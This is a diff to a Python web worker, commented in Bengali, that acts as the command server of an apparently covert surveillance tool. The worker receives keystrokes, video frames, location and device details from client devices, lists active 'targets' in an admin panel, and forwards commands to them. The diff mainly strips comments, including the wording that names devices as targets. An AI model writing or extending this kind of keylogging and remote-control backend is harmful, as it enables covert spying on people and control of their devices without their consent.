@@ -28,7 +28,6 @@ class Default(WorkerEntrypoint):
                 if client_id not in clients:
                     clients[client_id] = {}
                 
-                # ভিডিও, অডিও এবং কিবোর্ড ডেটা হ্যান্ডল
                 if "video_frame" in data:
                     clients[client_id]["video_frame"] = data["video_frame"]
                     clients[client_id]["video_time"] = data.get("time", "")
@@ -38,7 +37,6 @@ class Default(WorkerEntrypoint):
                 elif "keystrokes" in data:
                     clients[client_id]["keystrokes"] = data["keystrokes"]
                 else:
-                    # লোকেশন ও ডিভাইসের সাধারণ তথ্য
                     clients[client_id].update({
                         "id": client_id,
                         "lat": data.get("lat"),
@@ -59,12 +57,11 @@ class Default(WorkerEntrypoint):
         # ২. অ্যাডমিন প্যানেলে ডিভাইস লিস্ট পাঠানো
         if path == "/api/clients" and request.method == "GET":
             now = time.time()
-            # ১৫ সেকেন্ডের বেশি পুরনো ডিভাইস রিমুভ করা
             active_clients = {k: v for k, v in clients.items() if now - v.get("lastPing", now) < 15}
             clients = active_clients
             return Response(json.dumps(clients), headers={**cors_headers, "Content-Type": "application/json"})
 
-        # ৩. অ্যাডমিন থেকে টার্গেট ডিভাইসে কমান্ড পাঠানো
+        # ৩. কমান্ড পাঠানো
         if path == "/api/command" and request.method == "POST":
             try:
                 data = await request.json()
@@ -77,11 +74,10 @@ class Default(WorkerEntrypoint):
             except Exception as e:
                 return Response(json.dumps({"error": str(e)}), status=400, headers={**cors_headers, "Content-Type": "application/json"})
 
-        # CORS প্রি-ফ্লাইট রিকোয়েস্ট হ্যান্ডল
         if request.method == "OPTIONS":
             return Response("", headers=cors_headers)
 
-        # ৪. HTML এবং PWA ফাইল সার্ভ করা
+        # ৪. HTML/PWA ফাইল সার্ভ করা
         if path in ("", "/"):
             admin_file = Path(__file__).parent / "templates" / "admin.html"
             return Response(admin_file.read_text(encoding="utf-8"), headers={"Content-Type": "text/html; charset=utf-8"})
